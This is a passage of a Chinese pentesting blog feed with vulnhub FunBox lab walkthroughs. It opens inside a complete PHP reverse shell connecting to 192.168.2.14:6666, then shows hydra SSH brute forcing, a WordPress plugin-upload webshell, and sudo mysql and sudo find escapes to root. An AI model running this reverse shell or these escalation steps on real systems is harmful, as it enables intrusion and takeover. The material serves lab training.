string">'192.168.2.14'</span><span class="token punctuation">;</span>  // CHANGE THIS<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span>       // CHANGE THIS<span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span><span class="token variable">$write_a</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token variable">$error_a</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>//// Daemonise ourself <span class="token keyword">if</span> possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try<span class="token punctuation">..</span>.<span class="token keyword">if</span> <span class="token punctuation">(</span>function_exists<span class="token punctuation">(</span><span class="token string">'pcntl_fork'</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>// Fork and have the parent process <span class="token builtin class-name">exit</span><span class="token variable">$pid</span> <span class="token operator">=</span> pcntl_fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>printit<span class="token punctuation">(</span><span class="token string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  // Parent exits<span class="token punctuation">&#125;</span>// Make the current process a session leader// Will only succeed <span class="token keyword">if</span> we forked<span class="token keyword">if</span> <span class="token punctuation">(</span>posix_setsid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>printit<span class="token punctuation">(</span><span class="token string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>printit<span class="token punctuation">(</span><span class="token string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>// Change to a safe directorychdir<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// Remove any <span class="token builtin class-name">umask</span> we inheritedumask<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//// Do the reverse shell<span class="token punctuation">..</span>.//// Open reverse connection<span class="token variable">$sock</span> <span class="token operator">=</span> fsockopen<span class="token punctuation">(</span><span class="token variable">$ip</span>, <span class="token variable">$port</span>, <span class="token variable">$errno</span>, <span class="token variable">$errstr</span>, <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>printit<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$errstr</span> (<span class="token variable">$errno</span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>// Spawn shell process<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> array<span class="token punctuation">(</span>   <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> array<span class="token punctuation">(</span><span class="token string">"pipe"</span>, <span class="token string">"r"</span><span class="token punctuation">)</span>,  // stdin is a pipe that the child will <span class="token builtin class-name">read</span> from   <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> array<span class="token punctuation">(</span><span class="token string">"pipe"</span>, <span class="token string">"w"</span><span class="token punctuation">)</span>,  // stdout is a pipe that the child will <span class="token function">write</span> to   <span class="token number">2</span> <span class="token operator">=</span><span class="token operator">></span> array<span class="token punctuation">(</span><span class="token string">"pipe"</span>, <span class="token string">"w"</span><span class="token punctuation">)</span>   // stderr is a pipe that the child will <span class="token function">write</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$process</span> <span class="token operator">=</span> proc_open<span class="token punctuation">(</span><span class="token variable">$shell</span>, <span class="token variable">$descriptorspec</span>, <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>is_resource<span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>printit<span class="token punctuation">(</span><span class="token string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="token string">'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) &#123;// Check for end of TCP connectionif (feof($sock)) &#123;printit("ERROR: Shell connection terminated");break;&#125;// Check for end of STDOUTif (feof($pipes[1])) &#123;printit("ERROR: Shell process terminated");break;&#125;// Wait until a command is end down $sock, or some// command output is available on STDOUT or STDERR$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);// If we can read from the TCP socket, send// data to process'</span>s STDIN<span class="token keyword">if</span> <span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$sock</span>, <span class="token variable">$read_a</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> printit<span class="token punctuation">(</span><span class="token string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> fread<span class="token punctuation">(</span><span class="token variable">$sock</span>, <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> printit<span class="token punctuation">(</span><span class="token string">"SOCK: <span class="token variable">$input</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>, <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>// If we can <span class="token builtin class-name">read</span> from the process<span class="token string">'s STDOUT// send data down tcp connectionif (in_array($pipes[1], $read_a)) &#123;if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);&#125;// If we can read from the process'</span>s STDERR// send data down tcp connection<span class="token keyword">if</span> <span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>, <span class="token variable">$read_a</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> printit<span class="token punctuation">(</span><span class="token string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> fread<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>, <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> printit<span class="token punctuation">(</span><span class="token string">"STDERR: <span class="token variable">$input</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$sock</span>, <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>fclose<span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>proc_close<span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// Like print, but does nothing <span class="token keyword">if</span> we<span class="token string">'ve daemonised ourself// (I can'</span>t figure out how to redirect STDOUT like a proper daemon<span class="token punctuation">)</span><span class="token keyword">function</span> printit <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>print <span class="token string">"<span class="token variable">$string</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h3><p>打开另一个终端以使用 nc监听反向连接。如果没有获得反向 shell，请单击 Go 选项 3-4 次。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516214742377.png" alt="image-20240516214742377"></p><p>使用python切换shell：python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516220514982.png" alt="image-20240516220514982"></p><h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4)ssh登录"></a>4)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516220710487.png" alt="image-20240516220710487"></p><p>可以看到提权方式是2个，但是需要root密码</p><p>进入家目录 发现有五个用户(我们想到题目的提示hydra) 直接尝试暴力破解 使用 hydra 一个一个试 最后爆破得到：goat&#x2F;thebest</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516220950104.png" alt="image-20240516220950104"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> goat <span class="token parameter variable">-P</span> <span class="token string">"rockyou.txt"</span> ssh://192.168.2.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516222130559.png" alt="image-20240516222130559"></p><p>我们可以看到爆破成功，爆破时间8分钟</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516222309599.png" alt="image-20240516222309599"></p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>sudo -l 发现是mysql</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516222340084.png" alt="image-20240516222340084"></p><p>提权网站 查询一下：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516221954215.png" alt="image-20240516221954215"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/sh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516222436605.png" alt="image-20240516222436605"></p><p>可以看到权限是root用户,我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240516222521271.png" alt="image-20240516222521271"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBox-6</title>
    <link href="http://ms02423.top/2024/05/11/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-6/"/>
    <id>http://ms02423.top/2024/05/11/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-6/</id>
    <published>2024-05-11T13:14:40.000Z</published>
    <updated>2024-05-16T14:35:41.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">Not</span> a reallife box !It's a very easy box<span class="token punctuation">,</span> that makes you crazy<span class="token punctuation">.</span>## HINTS<span class="token punctuation">:</span>Don't forget <span class="token keyword">to</span> <span class="token keyword">add</span><span class="token punctuation">:</span> funbox6<span class="token punctuation">.</span>box <span class="token keyword">in</span> your <span class="token operator">/</span>etc<span class="token operator">/</span>hosts !This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注意提示:</p><pre class="line-numbers language-none"><code class="language-none">funbox6.box in your &#x2F;etc&#x2F;hosts !<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们猜测是域名和IP地址的绑定，这个靶场特别讨厌，它是一个定时任务</p><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-gamble-hall,551/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212117832.png" alt="image-20240511212117832"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212136707.png" alt="image-20240511212136707"></p><p>ip地址我们不知道，但是我们知道网段的192.168.2.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实IP地址"><a href="#1-寻找靶场真实IP地址" class="headerlink" title="1.寻找靶场真实IP地址"></a>1.寻找靶场真实IP地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212433435.png" alt="image-20240511212433435"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212536370.png" alt="image-20240511212536370"></p><p>根据上面两个命令我们知道IP地址为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212706956.png" alt="image-20240511212706956"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">开启了22端口，服务为ssh开启了80端口，服务为Apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a href="http://192.168.2.13/">http://192.168.2.13</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511212910243.png" alt="image-20240511212910243"></p><p>我们可以看到无法连接，想到题目的提示，我们需要绑定IP地址和域名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213006459.png" alt="image-20240511213006459"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213013475.png" alt="image-20240511213013475"></p><p>我们再次访问可以看到正常了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213047542.png" alt="image-20240511213047542"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213251335.png" alt="image-20240511213251335"></p><p>我们检测到cms是wordpress.我们可以想到爆破用户名和密码</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描网站结构"><a href="#1-nikto扫描网站结构" class="headerlink" title="1)nikto扫描网站结构"></a>1)nikto扫描网站结构</h3><pre class="line-numbers language-none"><code class="language-none">nikto -h http:&#x2F;&#x2F;192.168.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213625827.png" alt="image-20240511213625827"></p><p>我们扫描到一个登录页面</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213513093.png" alt="image-20240511213513093"></p><h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.2.13 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213732986.png" alt="image-20240511213732986"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511213818631.png" alt="image-20240511213818631"></p><p>没有什么用,还是一个登录页面</p><h3 id="3-drib扫描"><a href="#3-drib扫描" class="headerlink" title="3)drib扫描"></a>3)drib扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">drib http://192.168.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511214134769.png" alt="image-20240511214134769"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511214040395.png" alt="image-20240511214040395"></p><p>没有什么用,我们目前掌握的信息只有一个登录页面</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-wpscan爆破"><a href="#1-wpscan爆破" class="headerlink" title="1)wpscan爆破"></a>1)wpscan爆破</h3><p>爆破用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://funbox6.box/ <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511215500155.png" alt="image-20240511215500155"></p><p>爆破出来用户名是admin.</p><p>爆破密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220031884.png" alt="image-20240511220031884"></p><p>我们可以看到报错了</p><h3 id="2-定时任务"><a href="#2-定时任务" class="headerlink" title="2)定时任务"></a>2)定时任务</h3><p>如果我们不断刷新页面的话，可以看到这是一个定时任务，查看网站标题Gamble hall翻译过来就是赌博大厅，副标题是CLOSED，过了一段时间副标题会变化，CLOSED 和 OPENED是不停变化，猜测有一个定时任务</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511214352464.png" alt="image-20240511214352464"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511214403199.png" alt="image-20240511214403199"></p><p>我们一个标题都进行信息收集，发现在副标题为OPENED的时候，发现<a href="http://funbox6.box/index.php/2020/09/08/hello-world/%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8flag%EF%BC%9Aflag%7BMFSG22LOHJTWC3LCNRSWQYLMNQ3TONY=%7D%EF%BC%8C%E4%BD%BF%E7%94%A8base32%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0%E4%B8%80%E7%BB%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%9Aadmin:gamblehall777">http://funbox6.box/index.php/2020/09/08/hello-world/页面存在flag：flag{MFSG22LOHJTWC3LCNRSWQYLMNQ3TONY=}，使用base32解密得到一组用户名密码：admin:gamblehall777</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220408703.png" alt="image-20240511220408703"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220418753.png" alt="image-20240511220418753"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220430617.png" alt="image-20240511220430617"></p><p>admin:gamblehall777</p><h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3)登录"></a>3)登录</h3><p>使用用户名密码登录网站，发现登录失败，返回主页面查看，发现网站副标题状态为CLOSED，再等到该标题为OPENED的时候登录试试，登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220546811.png" alt="image-20240511220546811"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511220556077.png" alt="image-20240511220556077"></p><h3 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4)文件上传"></a>4)文件上传</h3><p><a href="http://funbox6.box/wp-admin/plugin-install.php">http://funbox6.box/wp-admin/plugin-install.php</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511221137973.png" alt="image-20240511221137973"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511221308831.png" alt="image-20240511221308831"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511222157978.png" alt="image-20240511222157978"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511222216170.png" alt="image-20240511222216170"></p><p>主机监听，点击webshell，反弹shell成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511222939037.png" alt="image-20240511222939037"></p><p>使用python获取交互式shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>查看网站有什么特权命令<code>sudo -l</code>，发现该权限能执行所有的特权命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511223111739.png" alt="image-20240511223111739"></p><p>直接使用find命令进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">find</span> /home <span class="token parameter variable">-exec</span> /bin/bash <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511223150145.png" alt="image-20240511223150145"></p><p>获取flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240511223213209.png" alt="image-20240511223213209"></p><p>至此获取到了所有得flag，渗透测试结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之FunBox-5</title>
    <link href="http://ms02423.top/2024/05/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-5/"/>
    <id>http://ms02423.top/2024/05/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFunBox-5/</id>
    <published>2024-05-04T13:16:37.000Z</published>
    <updated>2024-05-16T14:35:27.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Lets separate the script-kids from script-teenies.Hint: The first impression is not always the right one<span class="token operator">!</span>If you need hints, call me on twitter: @0815R2d2 Have fun<span class="token punctuation">..</span>.This works better with VirtualBox rather than VMwareThis works better with VirtualBox rather than VMware.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/funbox-next-level,547/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505210150176.png" alt="image-20240505210150176"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505210220611.png" alt="image-20240505210220611"></p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-探测IP地址"><a href="#1-探测IP地址" class="headerlink" title="1.探测IP地址"></a>1.探测IP地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240505210631152.png" alt="image-20240505210631152"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter 